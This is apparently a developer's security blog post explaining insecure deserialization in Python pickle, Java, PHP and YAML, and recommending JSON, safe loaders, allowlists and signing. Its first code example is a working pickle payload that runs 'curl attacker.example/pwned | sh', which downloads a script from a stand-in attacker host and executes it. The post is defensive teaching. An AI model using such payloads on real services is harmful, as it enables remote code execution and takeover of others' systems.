---
title: "🎁 Insecure Deserialization: The Bug That Turns Your JSON Into a Shell"
date: "2026-08-24"
excerpt: "You spent years learning not to trust user input in a SQL query. Now do the same for a `pickle.loads()` call — because deserializing untrusted data doesn't leak your database, it hands the attacker your process."
tags:
  - security
  - web-vulnerabilities
  - deserialization
  - owasp
featured: true
---

Here's a sentence that should worry you more than it usually does: "we just deserialize the object and use it." Deserialization sounds so mechanical — take bytes, turn them back into a data structure, move on — that it rarely gets the same scrutiny as, say, a raw SQL query built with string concatenation. But insecure deserialization isn't a data-integrity bug. It's a "the attacker chose what code runs on your server" bug wearing a data-format costume, and it's been quietly sitting in the OWASP Top 10 for a decade because almost nobody treats it with the paranoia it deserves.

The gap between "this looks like a config file" and "this is a remote code execution primitive" is exactly one `loads()` call, and most of us cross it without thinking twice.

## Why Deserialization Is Different From "Just Parsing"

Parsing JSON with `JSON.parse()` gives you back plain objects, arrays, strings, numbers. There's no path from a JSON string to arbitrary code execution because the format has no concept of "reconstruct this class and call its constructor." It's inert by design.

Object serialization formats — Python's `pickle`, Java's native serialization, PHP's `unserialize()`, Ruby's `Marshal` — are not inert. They exist specifically to reconstruct *live objects*, which means the deserializer has to instantiate classes, call constructors, and sometimes invoke magic methods automatically. That's the whole feature. And it's exactly the feature an attacker abuses, because if the deserializer will happily instantiate any class the payload names, an attacker who controls the payload effectively controls which code paths execute — before your application logic ever gets a say.

The canonical, embarrassingly simple example is Python's `pickle`:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # __reduce__ tells pickle how to "rebuild" this object —
        # here, by calling os.system with a shell command.
        return (os.system, ('curl attacker.example/pwned | sh',))

payload = pickle.dumps(Exploit())

# Anywhere downstream that does this on untrusted input:
pickle.loads(payload)   # <- shell command already ran. Game over.
```

There was no SQL injection, no XSS, no obvious "vulnerable" line of code that a linter would flag. `pickle.loads()` looks completely unremarkable — right up until the object being reconstructed defines `__reduce__` to run a shell command as a side effect of being "restored."

## Where This Actually Shows Up in Real Apps

Nobody writes `pickle.loads(user_input)` on purpose. It sneaks in sideways:

- **Session tokens or cookies** that are serialized server-side objects, base64-encoded, and trusted on the way back in — Java's `ysoserial` tool exists entirely because so many enterprise apps did exactly this.
- **Caching layers.** You serialize a query result to stick it in Redis or Memcached, and if that cache is ever writable by something less trusted than your app (a shared cache, a poisoned key, an SSRF into your own cache), deserializing it is deserializing attacker data.
- **Message queues.** A worker pulls a job off a queue and deserializes it to figure out what to run. If anything upstream of that queue can be influenced by an outside party, the worker is a code-execution oracle.
- **PHP's `unserialize()` on cookie or form data** — this pattern alone has produced a long, embarrassing list of CVEs in CMS platforms, because PHP objects can define `__wakeup()` or `__destruct()` magic methods that fire automatically on reconstruction, chaining into file writes, SQL calls, or worse.

The common thread: the data crossed a trust boundary — client to server, or a lower-privilege service to a higher-privilege one — and got deserialized on the other side as if it were still just data.

I ran into a milder version of this at Cubet while reviewing a job-queue integration: a worker service deserialized job payloads straight out of a queue that, it turned out, a lower-trust internal service could also write to. Nothing had been exploited — this was caught in a design review, not an incident — but it was a good reminder that "internal" and "trusted" aren't the same word, and the fix wasn't clever code, it was moving to a plain JSON schema for the job payload so there was nothing for a malicious object graph to attach to.

## The Fix: Stop Deserializing Objects, Start Parsing Data

The single most effective mitigation is refusing to use object-graph serialization for anything that crosses a trust boundary. Use JSON (or protobuf, or another schema-defined format) for that, precisely because those formats can't reconstruct arbitrary classes.

```python
# Instead of this:
import pickle
data = pickle.loads(untrusted_bytes)   # can execute arbitrary code

# Do this:
import json
data = json.loads(untrusted_bytes)     # can only ever produce
                                        # dict / list / str / int / float / bool / None
```

If you're stuck with a format that supports rich object reconstruction — Java serialization, PHP, YAML with `!!python/object` tags — the mitigations look the same everywhere:

1. **Never deserialize data from an untrusted source**, full stop, if you have any alternative.
2. **Use an allowlist deserializer** if the library supports one. Java's `ObjectInputFilter`, PyYAML's `yaml.safe_load()` instead of `yaml.load()`, and similar "safe" variants restrict reconstruction to a known set of harmless types.
3. **Sign or encrypt** serialized blobs that must round-trip through an untrusted client (session cookies, tokens), and verify the signature *before* deserializing — not after.
4. **Run deserialization in a low-privilege, sandboxed context** if you truly can't avoid it on untrusted input, so a code-execution primitive doesn't hand over the whole box.

```python
import yaml

# Vulnerable: yaml.load can instantiate arbitrary Python objects
config = yaml.load(untrusted_yaml, Loader=yaml.Loader)

# Safe: restricted to plain scalars, lists, and dicts
config = yaml.safe_load(untrusted_yaml)
```

That one-word swap — `load` to `safe_load` — has quietly closed more RCEs than most security teams get credit for.

## The Takeaway

SQL injection taught a generation of developers to never trust a string that becomes a query. Insecure deserialization is the same lesson, aimed at a blind spot most of us haven't updated yet: never trust a blob of bytes that becomes an *object*. If you can't say with confidence what format your app deserializes data from a network boundary, that's this week's audit — go check, because "we just deserialize it and use it" is exactly the sentence that precedes the incident report.

---

Found a spicy deserialization footgun in the wild, or want to talk through hardening a queue/cache boundary? Find me on [Twitter/X](https://twitter.com/kpanuragh) or [GitHub](https://github.com/kpanuragh) — always up for trading war stories.
